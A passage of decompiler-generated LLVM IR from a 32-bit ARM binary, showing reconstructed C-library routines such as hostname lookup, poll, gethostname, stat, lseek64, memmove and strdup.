  store i32 %v7_19864, i32* @r5, align 4
  %v2_19868 = icmp eq i32 %v7_19864, 0
  br i1 %v2_19868, label %bb34, label %dec_label_pc_19874

bb34:                                             ; preds = %dec_label_pc_19830
  %v1_1986c = load i32, i32* @r8, align 4
  %v2_1986c = load i32, i32* @r4, align 4
  %v3_1986c = inttoptr i32 %v2_1986c to i32*
  store i32 %v1_1986c, i32* %v3_1986c, align 4
  br label %dec_label_pc_19aec

dec_label_pc_19874:                               ; preds = %dec_label_pc_19830
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_19878 = inttoptr i32 %tmp18 to i32*
  %v2_19878 = load i32, i32* %v1_19878, align 4
  store i32 %v2_19878, i32* %r3.global-to-local, align 4
  %v7_1987c = icmp eq i32 %v2_19878, 1
  br i1 %v7_1987c, label %dec_label_pc_19898, label %dec_label_pc_19884

dec_label_pc_19884:                               ; preds = %dec_label_pc_19874
  %v7_19884 = icmp eq i32 %v2_19878, 4
  br i1 %v7_19884, label %dec_label_pc_198b8, label %dec_label_pc_1988c

dec_label_pc_1988c:                               ; preds = %dec_label_pc_19884
  %v3_1988c = icmp eq i32 %v2_19878, -1
  br i1 %v3_1988c, label %dec_label_pc_198ac, label %dec_label_pc_19aec

dec_label_pc_19898:                               ; preds = %dec_label_pc_19874
  %v7_19898 = icmp eq i32 %v7_19864, 2
  br i1 %v7_19898, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_19898
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_198c0

.thread4:                                         ; preds = %dec_label_pc_19898
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_198c0

dec_label_pc_198ac:                               ; preds = %dec_label_pc_1988c
  %v0_198ac = load i32, i32* @r4, align 4
  %v1_198ac = inttoptr i32 %v0_198ac to i32*
  %v2_198ac = load i32, i32* %v1_198ac, align 4
  store i32 %v2_198ac, i32* %r3.global-to-local, align 4
  %v7_198b0 = icmp eq i32 %v2_198ac, 2
  br i1 %v7_198b0, label %dec_label_pc_198b8, label %dec_label_pc_19aec

dec_label_pc_198b8:                               ; preds = %dec_label_pc_198ac, %dec_label_pc_19884
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_198c0

dec_label_pc_198c0:                               ; preds = %.thread4, %bb35, %dec_label_pc_198b8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_198b8 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_198c8 = load i32, i32* @r8, align 4
  %v1_198c8 = load i32, i32* @r4, align 4
  %v2_198c8 = inttoptr i32 %v1_198c8 to i32*
  store i32 %v0_198c8, i32* %v2_198c8, align 4
  %v0_198cc = load i32, i32* @sl, align 4
  %v1_198cc = inttoptr i32 %v0_198cc to i8*
  store i32 %v0_198cc, i32* %r0.global-to-local, align 4
  %v0_198d0 = load i32, i32* @r3, align 4
  %v1_198d0 = load i32, i32* @ip, align 4
  %v2_198d0 = inttoptr i32 %v1_198d0 to i32*
  store i32 %v0_198d0, i32* %v2_198d0, align 4
  %v3_198d4 = call i32 @strlen(i8* %v1_198cc)
  store i32 %v3_198d4, i32* %r0.global-to-local, align 4
  %v1_198d8 = add i32 %v3_198d4, 1
  store i32 %v1_198d8, i32* @r4, align 4
  %v0_198dc = load i32, i32* @r6, align 4
  %v7_198e0 = icmp sgt i32 %v0_198dc, %v1_198d8
  br i1 %v7_198e0, label %dec_label_pc_198e4, label %dec_label_pc_19ae8

dec_label_pc_198e4:                               ; preds = %dec_label_pc_198c0
  %v0_198e4 = load i32, i32* @sl, align 4
  store i32 %v0_198e4, i32* @r1, align 4
  store i32 %v1_198d8, i32* @r2, align 4
  store i32 %v0_1980c, i32* @r0, align 4
  %v0_198f0 = call i32 @memcpy()
  store i32 %v0_198f0, i32* %r0.global-to-local, align 4
  %v1_198f8 = load i32, i32* @r4, align 4
  %v2_198f8 = add i32 %v1_198f8, %v0_1980c
  %v1_198fc = sub i32 0, %v2_198f8
  %v1_19900 = load i32, i32* @r6, align 4
  %v2_19900 = sub i32 %v1_19900, %v1_198f8
  store i32 %v2_19900, i32* %r2.global-to-local, align 4
  %v1_19904 = urem i32 %v1_198fc, 4
  store i32 %v1_19904, i32* %r3.global-to-local, align 4
  %v2_19908 = sub i32 %v2_19900, %v1_19904
  store i32 %v2_19908, i32* @sb, align 4
  %v1_1990c = add i32 %v2_19908, -8
  store i32 %v1_1990c, i32* @r5, align 4
  %v7_19914 = icmp slt i32 %v1_1990c, 256
  br i1 %v7_19914, label %dec_label_pc_19ae8, label %dec_label_pc_19918

dec_label_pc_19918:                               ; preds = %dec_label_pc_198e4
  %v2_19918 = add i32 %v1_19904, %v2_198f8
  store i32 %v2_19918, i32* @fp, align 4
  store i32 %v0_1980c, i32* %ip.global-to-local, align 4
  %v1_19920 = add i32 %v2_19918, 8
  store i32 %v1_19920, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_19928 = add i32 %v2_19918, 16
  store i32 %v1_19928, i32* @r8, align 4
  %v4_1992c = inttoptr i32 %v2_19918 to i32*
  store i32 %v0_1980c, i32* %v4_1992c, align 4
  %v0_19930 = load i32, i32* @sl, align 4
  store i32 %v0_19930, i32* %r0.global-to-local, align 4
  %v0_19934 = load i32, i32* @r4, align 4
  %v1_19934 = load i32, i32* @fp, align 4
  %v2_19934 = add i32 %v1_19934, 4
  %v3_19934 = inttoptr i32 %v2_19934 to i32*
  store i32 %v0_19934, i32* %v3_19934, align 4
  %v0_19938 = load i32, i32* @r8, align 4
  %v2_1993c = inttoptr i32 %v0_19930 to i8*
  %v3_1993c = call i32 @inet_aton(i8* %v2_1993c, i32 %v0_19938)
  store i32 %v3_1993c, i32* %r0.global-to-local, align 4
  %v1_19940 = load i32, i32* @r4, align 4
  %v9_19940 = icmp eq i32 %v3_1993c, %v1_19940
  br i1 %v9_19940, label %dec_label_pc_19984, label %dec_label_pc_19948

dec_label_pc_19948:                               ; preds = %dec_label_pc_19918
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1994c = load i32, i32* @r7, align 4
  %v2_1994c = add i32 %v1_1994c, 8
  %v3_1994c = inttoptr i32 %v2_1994c to i32*
  store i32 2, i32* %v3_1994c, align 4
  %v0_19950 = load i32, i32* %r3.global-to-local, align 4
  %v2_19950 = mul i32 %v0_19950, 2
  %v1_19954 = load i32, i32* @r7, align 4
  %v2_19954 = add i32 %v1_19954, 12
  %v3_19954 = inttoptr i32 %v2_19954 to i32*
  store i32 %v2_19950, i32* %v3_19954, align 4
  %v3_19958 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19958, i32* %r2.global-to-local, align 4
  store i32 %v0_1980c, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_19964 = load i32, i32* @r4, align 4
  store i32 %v0_19964, i32* @r5, align 4
  %v0_19968 = load i32, i32* @r8, align 4
  %v1_19968 = load i32, i32* @fp, align 4
  %v2_19968 = add i32 %v1_19968, 8
  %v3_19968 = inttoptr i32 %v2_19968 to i32*
  store i32 %v0_19968, i32* %v3_19968, align 4
  %v0_1996c = load i32, i32* @r7, align 4
  %v1_1996c = load i32, i32* %r2.global-to-local, align 4
  %v2_1996c = inttoptr i32 %v1_1996c to i32*
  store i32 %v0_1996c, i32* %v2_1996c, align 4
  %v0_19970 = load i32, i32* @r7, align 4
  %v1_19970 = inttoptr i32 %v0_19970 to i32*
  %v2_19970 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_19970, i32* %v1_19970, align 4
  %v3_19970 = add i32 %v0_19970, 4
  %v4_19970 = inttoptr i32 %v3_19970 to i32*
  %v5_19970 = load i32, i32* @fp, align 4
  store i32 %v5_19970, i32* %v4_19970, align 4
  %v0_19974 = load i32, i32* @r6, align 4
  %v1_19974 = load i32, i32* @r7, align 4
  %v2_19974 = add i32 %v1_19974, 16
  %v3_19974 = inttoptr i32 %v2_19974 to i32*
  store i32 %v0_19974, i32* %v3_19974, align 4
  %v0_19978 = load i32, i32* @r4, align 4
  %v1_19978 = load i32, i32* @ip, align 4
  %v2_19978 = inttoptr i32 %v1_19978 to i32*
  store i32 %v0_19978, i32* %v2_19978, align 4
  %v0_1997c = load i32, i32* @r4, align 4
  %v1_1997c = load i32, i32* @r6, align 4
  %v2_1997c = add i32 %v1_1997c, 4
  %v3_1997c = inttoptr i32 %v2_1997c to i32*
  store i32 %v0_1997c, i32* %v3_1997c, align 4
  br label %dec_label_pc_19aec

dec_label_pc_19984:                               ; preds = %dec_label_pc_19918
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_19988 = icmp eq i32 %storemerge2, 0
  br i1 %v2_19988, label %dec_label_pc_199a0, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_19984
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_19878, align 4
  br label %dec_label_pc_19aec

dec_label_pc_199a0:                               ; preds = %dec_label_pc_19984
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_199ac = load i32, i32* @sl, align 4
  store i32 %v0_199ac, i32* %r0.global-to-local, align 4
  %v2_199b4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_199b4, i32* %r2.global-to-local, align 4
  %v2_199b8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_199b8, i32* %r3.global-to-local, align 4
  %v7_199c4 = inttoptr i32 %v0_199ac to i8*
  %v8_199c4 = call i32 @__dns_lookup(i8* %v7_199c4, i32 1, i32 %v2_199b4, i32 %v2_199b8)
  store i32 %v8_199c4, i32* %r0.global-to-local, align 4
  %v1_199c8 = icmp slt i32 %v8_199c4, 0
  br i1 %v1_199c8, label %.thread, label %dec_label_pc_199e0

.thread:                                          ; preds = %dec_label_pc_199a0
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_19878, align 4
  br label %dec_label_pc_19aec

dec_label_pc_199e0:                               ; preds = %dec_label_pc_199a0
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_199e4 = icmp eq i32 %tmp12, 1
  br i1 %v7_199e4, label %dec_label_pc_199ec, label %dec_label_pc_19ac4

dec_label_pc_199ec:                               ; preds = %dec_label_pc_199e0
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_19a04 = load i32, i32* @r5, align 4
  %v2_19a04 = add i32 %v0_19a04, -12
  store i32 %v2_19a04, i32* @r8, align 4
  %v8_19a04 = icmp slt i32 %v2_19a04, 0
  br i1 %v8_19a04, label %bb37, label %dec_label_pc_19a10

bb37:                                             ; preds = %dec_label_pc_199ec
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_19ad4

dec_label_pc_19a10:                               ; preds = %dec_label_pc_199ec
  %v0_19a10 = load i32, i32* @r6, align 4
  store i32 %v0_19a10, i32* @r1, align 4
  %v2_19a14 = add i32 %v0_19a10, 12
  store i32 %v2_19a14, i32* @r0, align 4
  %v2_19a18 = call i32 @memmove(i32 %v2_19a14, i32 %v0_19a10)
  %v0_19a1c = load i32, i32* @fp, align 4
  %v1_19a1c = add i32 %v0_19a1c, 4
  store i32 %v1_19a1c, i32* @r3, align 4
  %v1_19a20 = load i32, i32* @r4, align 4
  %v2_19a20 = add i32 %v1_19a20, %v1_19a1c
  store i32 %v2_19a20, i32* @r5, align 4
  store i32 %v2_19a20, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_19a30 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19a3c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19a3c

dec_label_pc_19a3c:                               ; preds = %dec_label_pc_19a3c, %dec_label_pc_19a10
  %v0_19a3c = phi i32 [ %v0_19a3c.pre, %dec_label_pc_19a10 ], [ %v1_19a40, %dec_label_pc_19a3c ]
  %v1_19a3c = load i32, i32* @r6, align 4
  %v7_19a3c = inttoptr i32 %v1_19a3c to i32*
  store i32 %v0_19a3c, i32* %v7_19a3c, align 4
  %v0_19a40 = load i32, i32* @r5, align 4
  %v1_19a40 = add i32 %v0_19a40, 4
  store i32 %v1_19a40, i32* @r5, align 4
  %v0_19a44 = load i32, i32* %r0.global-to-local, align 4
  %v1_19a44 = add i32 %v0_19a44, 1
  store i32 %v1_19a44, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_19a44, 0
  br i1 %tmp38, label %dec_label_pc_19a3c, label %dec_label_pc_19a54

dec_label_pc_19a54:                               ; preds = %dec_label_pc_19a3c
  %v3_19a54 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_19a54, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_19a5c = icmp eq i32 %v3_19a54, 0
  %v1_19a60 = load i32, i32* @r6, align 4
  %v5_19a60 = mul i32 %v1_19a44, 4
  %v6_19a60 = add i32 %v1_19a60, %v5_19a60
  %v7_19a60 = inttoptr i32 %v6_19a60 to i32*
  store i32 0, i32* %v7_19a60, align 4
  br i1 %v2_19a5c, label %dec_label_pc_19a90, label %dec_label_pc_19a68

dec_label_pc_19a68:                               ; preds = %dec_label_pc_19a54
  %v0_19a68 = load i32, i32* @r4, align 4
  %v1_19a68 = inttoptr i32 %v0_19a68 to i8*
  store i32 %v0_19a68, i32* %r0.global-to-local, align 4
  %v3_19a6c = call i32 @strlen(i8* %v1_19a68)
  store i32 %v3_19a6c, i32* %r0.global-to-local, align 4
  %v0_19a70 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_19a70, %v3_19a6c
  br i1 %tmp, label %dec_label_pc_19a78, label %dec_label_pc_19a90

dec_label_pc_19a78:                               ; preds = %dec_label_pc_19a68
  %v0_19a78 = load i32, i32* @r4, align 4
  store i32 %v0_19a78, i32* @r1, align 4
  %v0_19a7c = load i32, i32* @r5, align 4
  store i32 %v0_19a7c, i32* %r0.global-to-local, align 4
  %v2_19a80 = inttoptr i32 %v0_19a7c to i8*
  %v3_19a80 = call i32 @strcpy(i8* %v2_19a80, i32 %v0_19a78)
  store i32 %v3_19a80, i32* %r0.global-to-local, align 4
  %v0_19a84 = load i32, i32* @r5, align 4
  br label %dec_label_pc_19a90

dec_label_pc_19a90:                               ; preds = %dec_label_pc_19a68, %dec_label_pc_19a54, %dec_label_pc_19a78
  %storemerge1 = phi i32 [ %v0_19a84, %dec_label_pc_19a78 ], [ %v0_1980c, %dec_label_pc_19a68 ], [ %v0_1980c, %dec_label_pc_19a54 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_19a94 = load i32, i32* @r7, align 4
  %v2_19a94 = add i32 %v1_19a94, 8
  %v3_19a94 = inttoptr i32 %v2_19a94 to i32*
  store i32 2, i32* %v3_19a94, align 4
  %v0_19a98 = load i32, i32* %r2.global-to-local, align 4
  %v2_19a98 = mul i32 %v0_19a98, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_19aa0 = load i32, i32* @r7, align 4
  %v2_19aa0 = add i32 %v1_19aa0, 12
  %v3_19aa0 = inttoptr i32 %v2_19aa0 to i32*
  store i32 %v2_19a98, i32* %v3_19aa0, align 4
  %v3_19aa4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19aa4, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_19aac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_19aac, i32* @r5, align 4
  %v0_19ab0 = load i32, i32* @r7, align 4
  %v2_19ab0 = inttoptr i32 %v3_19aa4 to i32*
  store i32 %v0_19ab0, i32* %v2_19ab0, align 4
  %v0_19ab4 = load i32, i32* @r7, align 4
  %v1_19ab4 = inttoptr i32 %v0_19ab4 to i32*
  %v2_19ab4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_19ab4, i32* %v1_19ab4, align 4
  %v3_19ab4 = add i32 %v0_19ab4, 4
  %v4_19ab4 = inttoptr i32 %v3_19ab4 to i32*
  %v5_19ab4 = load i32, i32* @fp, align 4
  store i32 %v5_19ab4, i32* %v4_19ab4, align 4
  %v0_19ab8 = load i32, i32* @r6, align 4
  %v1_19ab8 = load i32, i32* @r7, align 4
  %v2_19ab8 = add i32 %v1_19ab8, 16
  %v3_19ab8 = inttoptr i32 %v2_19ab8 to i32*
  store i32 %v0_19ab8, i32* %v3_19ab8, align 4
  %v0_19abc = load i32, i32* %r3.global-to-local, align 4
  %v1_19abc = load i32, i32* %r2.global-to-local, align 4
  %v2_19abc = inttoptr i32 %v1_19abc to i32*
  store i32 %v0_19abc, i32* %v2_19abc, align 4
  br label %dec_label_pc_19ad4

dec_label_pc_19ac4:                               ; preds = %dec_label_pc_199e0
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_19878, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_19ad4

dec_label_pc_19ad4:                               ; preds = %bb37, %dec_label_pc_19a90, %dec_label_pc_19ac4
  %v3_19ad4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_19ad4, i32* @r0, align 4
  %v0_19ad8 = call i32 @free()
  %v3_19adc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_19adc, i32* @r0, align 4
  %v0_19ae0 = call i32 @free()
  store i32 %v0_19ae0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19aec

dec_label_pc_19ae8:                               ; preds = %dec_label_pc_198c0, %dec_label_pc_198e4
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_19aec

dec_label_pc_19aec:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_198ac, %dec_label_pc_1988c, %dec_label_pc_19ad4, %dec_label_pc_19948, %dec_label_pc_19ae8
  %v0_19aec = load i32, i32* @r5, align 4
  store i32 %v0_19aec, i32* %r0.global-to-local, align 4
  ret i32 %v0_19aec

; uselistorder directives
  uselistorder i32 %v0_19a68, { 1, 0 }
  uselistorder i32 %v1_19a44, { 1, 0, 2 }
  uselistorder i32 %v1_19a40, { 1, 0 }
  uselistorder i32 %v0_19a10, { 1, 0, 2 }
  uselistorder i32 %v2_19a04, { 1, 0 }
  uselistorder i32 %v1_19904, { 2, 1, 0 }
  uselistorder i32 %v1_198f8, { 1, 0 }
  uselistorder i32 %v0_198cc, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_19878, { 2, 0, 1, 3 }
  uselistorder i32 %v0_19818, { 1, 0 }
  uselistorder i32 %v0_1980c, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 19, 20, 3, 2, 5, 4, 6, 17, 18, 8, 7, 10, 9, 11, 13, 12, 15, 14, 16 }
  uselistorder i32 ()* @free, { 23, 22, 21, 20, 19, 18, 12, 11, 10, 9, 8, 7, 6, 5, 4, 24, 30, 29, 28, 17, 16, 15, 14, 1, 13, 27, 26, 25, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_19aec, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_19ae8, { 1, 0 }
  uselistorder label %dec_label_pc_19ad4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19a90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_198c0, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19afc = load i32, i32* @r7, align 4
  store i32 %v3_19afc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19b24, label %dec_label_pc_19b14

dec_label_pc_19b14:                               ; preds = %entry
  %v0_19b14 = call i32 @__GI___errno_location()
  %v0_19b18 = load i32, i32* %r7.global-to-local, align 4
  %v1_19b18 = sub i32 0, %v0_19b18
  %v2_19b1c = inttoptr i32 %v0_19b14 to i32*
  store i32 %v1_19b18, i32* %v2_19b1c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_19b28.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19b24

dec_label_pc_19b24:                               ; preds = %entry, %dec_label_pc_19b14
  %v2_19b28 = phi i32 [ %v3_19afc, %entry ], [ %v2_19b28.pre, %dec_label_pc_19b14 ]
  %v0_19b24 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_19b14 ]
  store i32 %v2_19b28, i32* @r7, align 4
  ret i32 %v0_19b24

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19b24, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_19b3c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_19b4c = call i32 @uname(i32 %v2_19b3c)
  %v7_19b50 = icmp eq i32 %v1_19b4c, -1
  br i1 %v7_19b50, label %bb, label %dec_label_pc_19b5c

bb:                                               ; preds = %entry
  store i32 %v1_19b4c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b98

dec_label_pc_19b5c:                               ; preds = %entry
  %v2_19b5c = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_19b64 = call i32 @strlen(i8* %tmp10)
  %v1_19b68 = add i32 %v3_19b64, 1
  %v1_19b6c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_19b68, %v1_19b6c
  br i1 %tmp, label %dec_label_pc_19b74, label %dec_label_pc_19b88

dec_label_pc_19b74:                               ; preds = %dec_label_pc_19b5c
  %v0_19b74 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19b80 = inttoptr i32 %v0_19b74 to i32*
  store i32 22, i32* %v2_19b80, align 4
  %v0_19b98.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b98

dec_label_pc_19b88:                               ; preds = %dec_label_pc_19b5c
  %v0_19b88 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_19b5c, i32* @r1, align 4
  %v2_19b90 = inttoptr i32 %v0_19b88 to i8*
  %v3_19b90 = call i32 @strcpy(i8* %v2_19b90, i32 %v2_19b5c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b98

dec_label_pc_19b98:                               ; preds = %bb, %dec_label_pc_19b74, %dec_label_pc_19b88
  %v0_19b98 = phi i32 [ %v1_19b4c, %bb ], [ %v0_19b98.pre, %dec_label_pc_19b74 ], [ 0, %dec_label_pc_19b88 ]
  ret i32 %v0_19b98

; uselistorder directives
  uselistorder i32 %v2_19b5c, { 1, 0 }
  uselistorder i32 %v1_19b4c, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32 22, { 3, 17, 4, 5, 19, 6, 7, 8, 9, 15, 10, 11, 12, 16, 13, 0, 18, 14, 1, 2 }
  uselistorder label %dec_label_pc_19b98, { 2, 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19be0, label %dec_label_pc_19bcc

dec_label_pc_19bcc:                               ; preds = %entry
  %v0_19bcc = call i32 @__GI___errno_location()
  %v0_19bd0 = load i32, i32* %r7.global-to-local, align 4
  %v1_19bd0 = sub i32 0, %v0_19bd0
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_19bd8 = inttoptr i32 %v0_19bcc to i32*
  store i32 %v1_19bd0, i32* %v2_19bd8, align 4
  br label %dec_label_pc_19bf0

dec_label_pc_19be0:                               ; preds = %entry
  %v2_19be0 = icmp eq i32 %arg1, 0
  br i1 %v2_19be0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19be0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19be0, %bb
  call void @__pseudo_cond_branch(i1 %v2_19be0, i32 ptrtoint (i32* @global_var_17cf4.917 to i32))
  br label %dec_label_pc_19bf0

dec_label_pc_19bf0:                               ; preds = %dec_label_pc_19bcc, %.thread
  %v0_19bf0 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_19bf0

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19bf0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19c40, label %dec_label_pc_19c2c

dec_label_pc_19c2c:                               ; preds = %entry
  %v0_19c2c = call i32 @__GI___errno_location()
  %v0_19c30 = load i32, i32* %r4.global-to-local, align 4
  %v1_19c30 = sub i32 0, %v0_19c30
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19c38 = inttoptr i32 %v0_19c2c to i32*
  store i32 %v1_19c30, i32* %v2_19c38, align 4
  %v0_19c48.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19c48

dec_label_pc_19c40:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_19c40 = icmp eq i32 %arg1, 0
  br i1 %v2_19c40, label %dec_label_pc_19c54, label %dec_label_pc_19c48

dec_label_pc_19c48:                               ; preds = %dec_label_pc_19c40, %dec_label_pc_19c2c
  %v0_19c48 = phi i32 [ %arg1, %dec_label_pc_19c40 ], [ %v0_19c48.pre, %dec_label_pc_19c2c ]
  br label %dec_label_pc_19c58

dec_label_pc_19c54:                               ; preds = %dec_label_pc_19c40
  br label %dec_label_pc_19c58

dec_label_pc_19c58:                               ; preds = %dec_label_pc_19c48, %dec_label_pc_19c54
  %v1_19c60 = phi i32 [ %v0_19c48, %dec_label_pc_19c48 ], [ %tmp8, %dec_label_pc_19c54 ]
  ret i32 %v1_19c60

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_19c58, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_19c70 = load i32, i32* @r0, align 4
  %v1_19c70 = load i32, i32* @r1, align 4
  %v2_19c70 = inttoptr i32 %v0_19c70 to i8*
  %v3_19c70 = call i32 @_memcpy(i8* %v2_19c70, i32 %v1_19c70)
  ret i32 %v3_19c70

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_19c80 = load i32, i32* @r4, align 4
  store i32 %v3_19c80, i32* %stack_var_-16, align 4
  %v9_19c80 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_19c88 = call i32 @strlen(i8* %arg1)
  %v1_19c8c = add i32 %v3_19c88, 1
  store i32 %v1_19c8c, i32* @r4, align 4
  %v1_19c94 = call i32 @malloc(i32 %v1_19c8c)
  store i32 %v1_19c94, i32* %r5.global-to-local, align 4
  %v2_19c98 = icmp eq i32 %v1_19c94, 0
  br i1 %v2_19c98, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_19ca4 = xor i1 %v2_19c98, true
  call void @__pseudo_cond_branch(i1 %v1_19ca4, i32 ptrtoint (i32* @global_var_11bf0.843 to i32))
  %v0_19ca8 = load i32, i32* %r5.global-to-local, align 4
  %v2_19cac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19cac, i32* @r4, align 4
  store i32 %v9_19c80, i32* @r6, align 4
  ret i32 %v0_19ca8

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 14, 13, 12, 6, 5, 15, 16, 22, 11, 10, 9, 1, 8, 7, 21, 20, 19, 18, 17, 4, 3, 2, 0 }
